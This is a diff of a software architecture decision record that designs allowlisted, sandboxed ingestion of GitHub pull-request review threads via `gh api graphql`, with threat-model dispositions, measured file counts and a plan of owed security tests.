+comment and review bodies, PR title and description, display name, file path as
+received, and the structural-looking metadata (labels, head branch name, milestone
+name) — is served under `contentClassification: untrusted-knowledge`,
+`mayContainInstructions: true`, `executable: false`. Every **provider**-controlled
+field — states, timestamps, line numbers, repository, PR number, ids, commit shas,
+CI outcome — is validated and normalized. Enumerating the fields in one place is
+what keeps a field from being scanned as content at ingestion and then served as
+structure.
 
 The file path is deliberately on the untrusted side: it is chosen by whoever
 authored the pull request. It is served as data and **SHALL NOT** be used to build
 a filesystem path — the containment SEC-7 requires is not weakened by a string
-that arrived over the network.
+that arrived over the network, and decision 3 states the same rule for the *write*
+path.
 
 **The disclosure closure is its own round, and its test is built with the serving
-change.** ADR-0029's closure argument says it in four words — "a **new surface
+change.** ADR-0029's closure argument says it in five words — "a **new surface
 owes its own**" — so `review.search` inherits nothing from `review.findings`'
 round. The closure form this project uses is one query against two
 corpora: an index that **held** withheld rows and an index that **never did** must
@@ -404,21 +612,39 @@ Two inherited controls are named so the serve slice does not rediscover them:
   index-build time, which a filter does not clean and a tombstone does not move.
   This is ADR-0029's family-4 third instance, and it applies here unchanged.
 - `reviewIngestion: true` (with its scope field, decision 2) flips **at the serve
-  slice**, not at ingest — the flag says what a client may call.
+  slice**, not at ingest, because from that slice the flag means *an ingestion
+  call surface exists that a client may call* — the narrowed meaning decision 2
+  records, whose six citing sites are rewritten in slice 1, two slices before the
+  flip.
+- **The triple is bound by import, not by spelling.** A `review.search` payload
+  carries `theurian.mcp.results.SAFETY` (`mcp/results.py:44`) splatted into the
+  result — imported, never re-typed — so a future edit to the shared constant
+  reaches this surface too. A test that asserts three literal key/value pairs
+  passes on a payload that re-spells them locally and then drifts; the owed test
+  therefore asserts the payload against the imported object, with a companion that
+  the assertion can fail.
 
 ## Consequences
 
 ### Positive
 
-- **T-7's repository allowlist stops being owed and starts running.** Four places
-  promise this control today and each says in the same breath that nothing
-  enforces it — the schema description ("Not in force"), the
-  `infrastructure/github/` docstring ("owed with the adapter rather than in
-  force"), the T-7 threat-model row ("owed with the first external fetch path"),
-  and `review-knowledge.md` ("the design obligation on the adapter, not current
-  behaviour"). Slice 1 is the first change that can carry it, and the
-  threat-model entry is rewritten per control rather than repointed at another
-  epic.
+- **T-7's repository allowlist stops being owed and starts running.** The control
+  is promised in many places and enforced in none. Measured 2026-09-05 at
+  `1fe3302b`, key = the literal phrase, population = the repository minus
+  `.claude/`, `docs/work-logs/` and this ADR:
+  `git grep -l "repository allowlist" -- . ':!.claude' ':!docs/work-logs' ':!docs/adr/0030-*'`
+  → **8 files, 20 lines**. **The key's recorded limit:** it misses the places that
+  spell it differently — the schema description ("Not in force. Allowlist of
+  `owner/repo` values…"), the `infrastructure/github/` docstring ("Repositories
+  must be allowlisted… owed with the adapter rather than in force") and
+  `review-knowledge.md` ("the design obligation on the adapter, not current
+  behaviour") — so 8 is a floor, not a census. **And T-7 is two entries, not one**:
+  `docs/security/threat-model.md:6454` and
+  `docs/architecture/requirements-analysis.md:1352` each carry their own T-7 row
+  naming the allowlist as owed to #429, so "the T-7 entry" is always plural here
+  and slice 1 rewrites **both**. Slice 1 is the first change that can carry the
+  control, and both entries are rewritten per control rather than repointed at
+  another epic.
 - **No new production dependency and no token custody.** The core's runtime
   dependencies are six (`jsonschema`, `pydantic`, `python-ulid`, `pyyaml`,
   `referencing`, `typer` — `packages/theurian-core/pyproject.toml`, measured
@@ -427,7 +653,7 @@ Two inherited controls are named so the serve slice does not rediscover them:
 - **The absence control is replaced by something that keeps working after the
   first fetch lands.** "Nothing can reach out" is a sentence with no successor:
   the first time it is false it is retired, and whatever it was protecting is
-  unprotected. Nine clauses with nine tests still say something on the day after.
+  unprotected. Ten clauses with their own tests still say something on the day after.
 - **Evidence outlives the upstream.** Files-as-source means a deleted upstream
   comment is still in the record, which is the whole point of ingesting review
   history rather than querying it live.
@@ -462,18 +688,21 @@ Two inherited controls are named so the serve slice does not rediscover them:
 - **`.theurian/review/` is not automatically committed.** The ADR decides only
   that it is not a cache; whether a given project tracks it is that project's
   decision.
-- The **six planned `review.*` tools other than `review.search`** stay planned.
-  This ADR neither builds nor retires them.
+- The **five planned `review.*` tools other than `review.search`** stay planned
+  (seven rows: one shipped, six planned, of which `review.search` is one). This
+  ADR neither builds nor retires them.
 
 ## What this does not close
 
 1. **Private-repository ingestion**, and with it the `securityRelated`
    ingestion-time marking plus uniform serve refusal that ADR-0029 assigned to
-   this arm. It is future work for the follow-up that adds private repositories,
-   and it is not built in Milestone 8.
+   this arm. Owned by
+   [#575](https://github.com/theurian/theurian/issues/575); not built in
+   Milestone 8, and ADR-0029's owed table names #575 rather than this ADR.
 2. **FR-V2 classification and FR-V3 `KnowledgeCandidate` generation.** The
    write-path half of Phase B, SEC-12-gated, deliberately sequenced after
-   ingestion.
+   ingestion — and with it **how `PromotionGate` should treat an unknown CI
+   outcome**, since its `ci_successful` is a required `bool` today (decision 5).
 3. **The other two T-7 controls in their raw-URL form** — the scheme allowlist and
    private-network rejection — stay [#429](https://github.com/theurian/theurian/issues/429)'s
    (see *Dispositions*).
@@ -489,22 +718,39 @@ Two inherited controls are named so the serve slice does not rediscover them:
 7. **What `gh` does after the vector is handed over.** Clause 8's version floor
    bounds *which* binary, not its behaviour; the residual is recorded in decision
    1 and in *Consequences → Negative*.
+8. **Propagating an upstream edit or delete into the evidence files.** Decision 2
+   records the retention residual and the manual remediation — delete the file,
+   rebuild the derived store; a capability that *notices* an upstream deletion and
+   acts on it is not designed here.
+9. **Headless environment-token authentication.** Excluded from clause 4's
+   constant by decision, not by omission: identity comes from the operator's
+   persisted `gh` login. Admitting a token variable is a decision with its own
+   reasoning, owed to whoever needs it.
 
 ## Dispositions this ADR records
 
 Each disposition is a decision with a reason, recorded here so a later session
 finds an answer rather than an open question.
 
-**#429 is narrowed, not closed.** Slice 1 discharges **one** of T-7's three
-controls — the repository allowlist — for **one** activation context. The scheme
-allowlist and private-network rejection stay #429's in their raw-URL form,
-because #429's activation context is wider than this ADR: it includes the OpenAPI
-`$ref` fetcher, where a URL from an ingested document is the input. T-7 is
-therefore rewritten **per control** in slice 1: the absence control retired at a
-named commit, the allowlist recorded as discharged with the test that pins it,
-and the other two still owed with #429 named. The threat model's own lesson is
-the reason this is spelled out — "an owner has to be the change that would
-implement the control" — and this entry has had the wrong owner twice.
+**#429 is narrowed, not closed.** Slice 1 discharges **two** of T-7's three
+controls **for the `gh` activation context only**, and leaves all three owed in
+the raw-URL context that is #429's:
+
+| T-7 control | On the `gh` path (slice 1) | In the raw-URL context |
+| :-- | :-- | :-- |
+| Repository allowlist | **discharged** — consulted before the spawn, with its pinning test | n/a |
+| Private-network rejection | **discharged by clause 4**, not by a destination check: with the environment constructed, the inputs that redirect a request to a private address — the proxy family (run C) and the config file (runs D–F) — are not present in the child. Its measurement is runs C and D–F, and clause 4's test (ii) is the control that keeps it demonstrated | **still #429's** |
+| Scheme allowlist | not applicable — there is no URL in the argument vector to check a scheme on (clause 2) | **still #429's** |
+
+#429's activation context is wider than this ADR: it includes the OpenAPI `$ref`
+fetcher, where a URL taken from an ingested document is the input, and there both
+the scheme allowlist and a destination check are live checks with something to
+check. T-7 is therefore rewritten **per control** in slice 1 — the absence control
+retired at a named commit, the two discharged controls recorded with the tests
+that pin them and the context they hold in, and the rest still owed with #429
+named. The threat model's own lesson is the reason this is spelled out — "an owner
+has to be the change that would implement the control" — and this entry has had
+the wrong owner twice.
 
 **The fetch-absence prose population moves in slice 1, in the same PR as the first
 spawn site.** Not a later slice, and not a follow-up: on-main claims must never
@@ -522,6 +768,31 @@ same discipline `tools/audit/owner_position_cites.py` uses: narrow the populatio
 to what a person must read, then have the person read it. The number is a
 *dispatch input*, re-measured when slice 1 is briefed, not a claim about how many
 sentences are wrong. This sequencing is binding.
+
+**A second population moves in the same slice, and it needs its own key: the
+sentences that attribute this unbuilt work to Milestone 7.** Milestone 7 is closed
+and built no fetch path, so every one of them is false today — the two corrected
+in `review-knowledge.md` by this PR were members. The key pairs the milestone with
+the subject, over shipped source, tests and plugin command documents (CHANGELOGs
+are excluded: a dated entry records what was believed when it was written):
+
+```console
+$ git grep -n "Milestone 7" -- packages/theurian-core/src packages/theurian-core/tests plugins/claude-code/commands \
+    | grep -icE "ingest|gh api|reach github|allowlist"
+10
+```
+
+**10 lines across 7 files** at `1fe3302b`. Round one's own measurement of this
+class was **8 lines across 4 files** under a narrower key; the difference is the
+two *scheme-allowlist* attributions (`parsers/openapi.py:11`,
+`test_ref_recording.py:162`) and a mirrored plugin line — a different T-7 control
+with the same milestone-attribution defect, so the wider key is the one slice 1
+dispatches on. **The key's recorded limit:** it selects on one physical line, so it
+misses attributions whose two halves sit on different lines —
+`test_network_call_sites.py:8` and `:606` are members it does not return. Like the
+population above, it is a dispatch input to be re-measured when slice 1 is
+briefed, and it is **slice 1's** because that is the slice whose fetch path makes
+the attribution actively misleading.
 
 **The #368 / #479 boundary, stated so a third owner-position defect cannot
 happen.** [#368](https://github.com/theurian/theurian/issues/368) (open, phase-b)
@@ -556,42 +827,74 @@ construction — the same way ADR-0025 through ADR-0029 already are. Stated beca
 every repo-wide claim in this repository declares which side of the frozen corpus
 it stands on.
 
-**The serve slice's real-run verification data source is decided now, not at slice
-3.** Verification runs against a **named disposable public fixture repository
-under the theurian org** — for example `review-ingestion-fixture` — carrying a
-planted, frozen PR and thread set; it is created when slice 3's verification needs
-it, allowlisted **only in the verification configuration**, and never in a shipped
-default. The ground for deciding it now is the dogfood measurement below: this
-repository cannot exercise thread ingestion at all, so "run it for real" has no
-data source unless one is made. The rejected alternative is recorded: an external
-third-party public repository, rejected because its content can change or vanish
-under the assertions, and ground truth a harness asserts against has to be under
-this project's control.
+**Dogfood ground: thin, bot-authored and mutable — not absent.** Two
+measurements, each with a bounded population, because the first one's window moves
+and a moving window cannot be re-checked later:
 
-**Dogfood honesty: this repository is not a review-ingestion corpus.** Measured
-2026-09-05 by the design consult (`gh api graphql` over
-`pullRequests(last: 40, states: MERGED)` on theurian/theurian), the last 40 merged
-pull requests carry **0 inline review threads and 0 top-level reviews** — this
-project's review rounds happen in agent transcripts and land as commit trailers,
-which is exactly why ADR-0029's arm exists. Dogfooding this capability on this
-repository therefore yields `ReviewEvent` records and nothing below them. The
-capability's content value is for repositories that review on GitHub natively.
-Recorded so that no completion claim for Milestone 8 overstates what was
-exercised.
+| Measurement | Population, bounded | Result |
+| :-- | :-- | :-- |
+| Design consult, 2026-09-05 (`gh api graphql`, `pullRequests(last: 40, states: MERGED)`) | the 40 most recently merged PRs on that date. Bounded locally: the last 40 merges on `origin/main` at `1fe3302b` carry 37 trailing PR refs spanning **#440–#563** (`git log origin/main --format='%s' -40 \| grep -oE '\(#[0-9]+\)$'`) | **0** inline review threads, **0** top-level reviews |
+| Adversarial review, 2026-09-05 (REST `pulls` / `comments`), re-run by the orchestrator | keyed by PR number, not by a window: **#12, #132, #224, #352, #569** | **11** inline review threads (#352 ×5, #12 ×2, #224 ×2, #132, #569) and **5** `COMMENTED` top-level reviews — every root comment authored by `github-advanced-security[bot]`, one of them dated 2026-09-05 on the still-open #569 |
+
+**The second measurement falsifies the universal an earlier draft of this section
+drew from the first**, which said this repository "cannot exercise thread
+ingestion at all". Every one of those five PRs is outside the merged window:
+#12, #132, #224 and #352 are below #440, and #569 is above #563 and not merged.
+The narrow 0/0 reading was true; the universal was not, and it is withdrawn here
+rather than softened.
+
+What remains true is the ground the fixture decision actually rests on: this
+project's review rounds happen in agent transcripts and land as commit trailers —
+which is why ADR-0029's arm exists — so the native GitHub-side population is
+**thin (11 threads across the repository's whole history), bot-authored (every
+root comment from one scanner), and mutable (one thread sits on an open PR and can
+change under an assertion)**. Dogfooding on this repository is worth doing and is
+not a substitute for a controlled corpus. Recorded so that no completion claim for
+Milestone 8 overstates what was exercised.
+
+**So the serve slice's real-run verification data source is decided now, not at
+slice 3.** Verification runs against a **named disposable public fixture
+repository under the theurian org** — for example `review-ingestion-fixture` —
+carrying a planted, frozen PR and thread set; it is created when slice 3's
+verification needs it, allowlisted **only in the verification configuration**, and
+never in a shipped default. The ground is the population above: assertions need
+data that does not move, and the native threads are thin, bot-authored and — on an
+open PR — live. The rejected alternative is recorded: an external third-party
+public repository, rejected for the same reason one step further out, its content
+being owned by someone else entirely.
 
 ### Slicing plan
 
 | Slice | Contents | Notable ordering |
 | :-- | :-- | :-- |
-| **1 — ingest** | the allowlist reader **as its own commit**; then domain fidelity (decision 5); then the adapter, the nine clause tests, and the document corrections | The allowlist reader is a separate commit because it flips a *different measured set* from the adapter: it reddens `tests/unit/test_config_key_call_sites.py`'s pinned absence and moves the prose that says nothing reads the key — 15 files name `providers.review.repositories` (`git grep -l 'providers\.review\.repositories' -- . ':!.claude' \| wc -l`, 2026-09-05, `origin/main` @ `1fe3302b`; key = the literal dotted key), which is not the same population as the fetch-absence set above |
+| **1 — ingest** | the allowlist reader **as its own commit** (with the schema-pattern tightening, decision 3); then domain fidelity (decision 5); then the adapter, the ten clause tests, and the document corrections | **The split is justified by a pinned test, not by disjointness** — see the note below, which measures the overlap the earlier draft assumed away |
 | **2 — land** | evidence files under `.theurian/review/`, the ingestion-time secret-scan gate, the CLI entry point | The CLI verb is slice 2's to choose; naming one here would assert a command that does not exist |
 | **3 — serve** | the SQLite serving store, `review.search`, its wire schema, the capability flag and scope field, and the T-7 / roadmap / `mcp-tools.md` updates that follow from serving | The disclosure round and the two-corpora fixture belong to this slice |
+
+**Why the allowlist reader is its own commit — the real reason, measured.** An
+earlier draft said the two commits touch different file sets. **They do not**: of
+the 15 files naming `providers.review.repositories`, **11 are also in the
+fetch-absence population** at `1fe3302b` (12 on this branch, the twelfth being this
+ADR, which is a member of both populations it measures):
+
+```console
+$ comm -12 <(git grep -l -i -E "reviewIngestion|nothing (here )?can reach out|no external fetch|contacts no repository|never fetche[sd]|first external fetch" -- . ':!.claude' | sort) \
+           <(git grep -l 'providers\.review\.repositories' -- . ':!.claude' | sort) | wc -l
+      12
+```
+
+The justification is a **pinned test**, not disjointness:
+`tests/unit/test_config_key_call_sites.py` asserts by equality that **nothing
+reads the key**, so the reader's commit is the one that must flip that pin and
+rewrite the sentences resting on it. Bundling it with the adapter would put two
+independently-revertable claim flips in one commit. Because the file sets overlap,
+the two commits are **sequenced serially in one worktree**, never fanned out.
 
 ## Alternatives considered
 
 | Alternative | Why rejected |
 | :-- | :-- |
-| **An in-process HTTP client (`httpx` plus a token from the environment)** | Three costs at once. It adds a production dependency to a core whose runtime dependency list is six packages, none of them an HTTP client. It puts **token custody** inside Theurian — reading, holding and possibly logging a credential the operator currently keeps in their own credential store. And it creates a **raw-URL surface**, which makes all three of SEC-10's controls live checks that must be built and kept correct, where the `gh api graphql` form has no URL for a scheme allowlist or a private-network check to be applied to. The `gh` spawn trades a process boundary for all three. |
+| **An in-process HTTP client (`httpx` plus a token from the environment)** | Three costs at once. It adds a production dependency to a core whose runtime dependency list is six packages, none of them an HTTP client. It puts **token custody** inside Theurian — reading, holding and possibly logging a credential the operator currently keeps in their own credential store. And it creates a **raw-URL surface**, which makes all three of SEC-10's controls live checks that must be built and kept correct. The `gh api graphql` form does not make the SSRF class disappear — run C and runs D–F show the destination moving under a pinned hostname — it removes the *input* those two checks read: there is no URL in the argument vector to apply a scheme allowlist to, and the private-network reach is closed by constructing the environment (clause 4) rather than by inspecting a destination. The `gh` spawn trades a process boundary for that. |
 | **Inherit the parent environment and scrub the dangerous variables** | A scrub is a blocklist over a set the adapter does not control. Run C measured that `HTTPS_PROXY` moves the request even with `--hostname` pinned, so the blocklist would have to be complete over destination variables, proxy variables, and whatever the next `gh` release reads. Constructing the environment inverts the burden onto a set this project chooses and pins. |
 | **`gh api --paginate`** | Whatever the flag follows, the *response* chooses it rather than the adapter — and this design pins no version-specific semantics for it (clause 8 bounds the binary's version, not its behaviour). Excluding the flag is cheaper than characterising it: a GraphQL cursor is an opaque string in a typed variable, so the adapter still decides every destination it reaches. |
 | **`gh api repos/{owner}/{repo}/pulls/...` (the REST path form)** | Repository identity would travel in the URL position, where it is string-interpolated into a path. The GraphQL form carries the same identity as typed variables with no path to escape into, which is what makes clause 2 a checkable property rather than a promise about quoting. |
@@ -632,44 +935,72 @@ Measured now, and reproducible from this ADR (2026-09-05, `origin/main` @
   packages/theurian-core/src`).
 - The core's runtime dependency list is **6** packages, none an HTTP client
   (`packages/theurian-core/pyproject.toml`).
-- The fetch-absence prose population is **30** files under the wide phrase key
-  printed in *Dispositions*, re-measured at slice-1 dispatch.
-- The `providers.review.repositories` population is **15** files
-  (`git grep -l 'providers\.review\.repositories' -- . ':!.claude' | wc -l`), a
-  different set from the one above — which is why the allowlist reader is its own
-  commit.
+- Three populations slice 1 must move, each with its key in *Dispositions* and
+  each a dispatch input to be re-measured then: the **fetch-absence prose**
+  (**30** files, wide phrase key), the **`providers.review.repositories`** key
+  (**15** files), and the **Milestone-7 attribution** (**10** lines across
+  **7** files). The first two overlap in **12** files on this branch (**11** at
+  `1fe3302b`), which is why the allowlist reader's commit is sequenced serially
+  before the adapter's rather than fanned out — the split is justified by
+  `test_config_key_call_sites.py`'s pinned absence, not by disjointness.
+- **This ADR is a member of both prose populations it measures**, which is why
+  every one of those counts is stated against a named commit rather than as a
+  property of the repository.
 - The no-code scope of this change: `git diff origin/main...HEAD --stat` shows
   only paths under `docs/`, and
   `git diff origin/main...HEAD -- '*.py' '*.schema.json'` is empty.
 
-Quoted, not re-run here (design consult, 2026-09-05, `gh` 2.86.0): runs A, B and
-C; the `PullRequestReviewThread` field list; and the observation that
-`http_unix_socket` is a configuration key on that version while `api_host` is not.
-Slice 1 re-runs A, B and C as driving tests, which is the point at which they
+Quoted, not re-run here — **design consult**, 2026-09-05, `gh` 2.86.0: runs A, B
+and C; the `PullRequestReviewThread` field list; the observation that
+`http_unix_socket` is a configuration key on that version while `api_host` is not;
+and the 0/0 thread count over the last-40-merged window. **Round one's adversarial
+review**, same date and binary: runs D, E and F, and the by-PR-number thread
+population (11 threads across #12, #132, #224, #352, #569, plus 5 top-level
+reviews) — run D and the thread population were re-run by the orchestrator and
+reproduced. Slice 1 re-runs A–F as driving tests, which is the point at which they
 become controls instead of quotations.
 
 Owed at implementation, each tied to the slice that discharges it:
 
 **Slice 1 — ingest**
 
-- **Nine clause tests**, one per row of decision 1's table: the single spawn site
+- **Ten clause tests**, one per row of decision 1's table: the single spawn site
   (equality-pinned), the literal `graphql` endpoint with identity in variables,
-  the `--hostname github.com` pin, the constructed `env={...}` allowlist with a
-  negative test that a destination-bearing parent variable does not reach the
-  child, the absolute binary path with `shell=False`, the absence of
-  `--paginate`, the timeout and the two caps as named constants, the version
-  floor's refusal, and the two graded refusal envelopes for absent and
-  unauthenticated `gh`.
+  the `--hostname github.com` pin, the absolute binary path with `shell=False`,
+  the absence of `--paginate`, the timeout and the two caps as named constants,
+  the version floor's refusal, the two graded refusal envelopes for absent and
+  unauthenticated `gh` with no stderr escaping them, and the per-response byte cap
+  with its incremental read.
+- **Clause 4 gets two tests, not one, because one of them passes vacuously.**
+  (i) the child's environment **equals** the enumerated constant — so the absence
+  of `GH_HOST`, `GH_REPO`, the `GH_TOKEN` family and the proxy family is a
+  consequence of equality rather than a list of remembered names; (ii) a
+  **run-D-shaped positive control** — an isolated config directory carrying
+  `http_unix_socket`, reached through a forwarded config-locating variable, moves
+  the request — which keeps the recorded residual demonstrated instead of asserted
+  and proves (i) can fail.
 - **The allowlist is consulted before the spawn** — a synthetic-input test that a
   repository outside `providers.review.repositories` produces **no process
   spawn**, not a filtered result.
 - **A private repository is refused at ingestion** — a synthetic-input test that
   nothing is written and the refusal carries a remedy.
+- **A renamed repository is refused** — a fixture whose response resolves to a
+  `nameWithOwner` other than the allowlisted entry is rejected, not followed.
+- **Evidence paths are containment-safe before the key is load-bearing** — the
+  schema pattern rejects `.` and `..` segments, and a path built from a hostile
+  `owner/repo` value resolves through `security/paths.py` and is refused; both in
+  the allowlist-reader commit.
 - **`test_network_call_sites.py`'s absence claim is retired in the same commit
   that admits the site**, with the pinned set growing by exactly one and the file's
   own admission checklist satisfied clause by clause.
-- **The T-7 entry is rewritten per control**, and the fetch-absence prose
-  population moves in the same PR.
+- **Both T-7 entries are rewritten per control** — `threat-model.md:6454` and
+  `requirements-analysis.md:1352` — recording the allowlist and the
+  private-network reach as discharged *on the `gh` path*, with clause 4 as the
+  latter's control and #429 still owning the raw-URL context.
+- **The three populations move in this PR**: the fetch-absence prose, the
+  `providers.review.repositories` sentences, and the Milestone-7 attributions.
+- **The six sites recording the old `reviewIngestion` meaning are rewritten**
+  (decision 2's table), two slices before the flag flips.
 - **The domain-model break is recorded** — a CHANGELOG entry under `#### Changed`
   with a `BREAKING` marker naming the old shape and the new one, and a
   `BREAKING CHANGE:` trailer on the commit.
@@ -681,16 +1012,28 @@ Owed at implementation, each tied to the slice that discharges it:
   report names the record and not the matched bytes, and that the run does not
   read as clean.
 - **`warn` lands and reports; `off` scans nothing** — one test each.
+- **The scan reads exactly the author-controlled fields** of decision 3's table —
+  a record whose secret sits in a label or a branch name is caught, not only one
+  whose secret sits in a body.
 - **Evidence files are the source** — a test that deleting the derived store and
   rebuilding from the files reproduces the served content, and that a record whose
   upstream has vanished survives a refetch.
+- **FR-V5, made checkable** — a walk of the ingest path's modules asserting that
+  none reaches an embedding, summarization or reranking provider, in the shape of
+  `test_no_registered_tool_can_reach_a_canonical_write`
+  (`tests/integration/test_mcp_tools.py:2357`): bytecode, not source, because a
+  provider resolved through a factory is invisible to a name scan. Until it lands,
+  decision 5's "no model exists anywhere in the ingest path" is design intent with
+  a named owner, not a measured property.
 
 **Slice 3 — serve**
 
-- **Every body-derived field carries the SEC-15 triple** — a test on the
-  `review.search` path asserting `contentClassification: untrusted-knowledge`,
-  `mayContainInstructions: true`, `executable: false`, with a companion asserting
-  that the check can fail.
+- **Every author-controlled field carries the SEC-15 triple, bound by import** —
+  a test that a `review.search` payload carries `theurian.mcp.results.SAFETY`
+  (`mcp/results.py:44`) itself, not three re-spelled literals, with a companion
+  asserting the check can fail. The population is decision 3's field table, so a
+  field added there without a disposition reddens this test rather than shipping
+  unclassified.
 - **The two-corpora equality** — one query against an index that held synthetic
   withheld rows and one that never did, asserting identical responses across every
   published field, count and member.
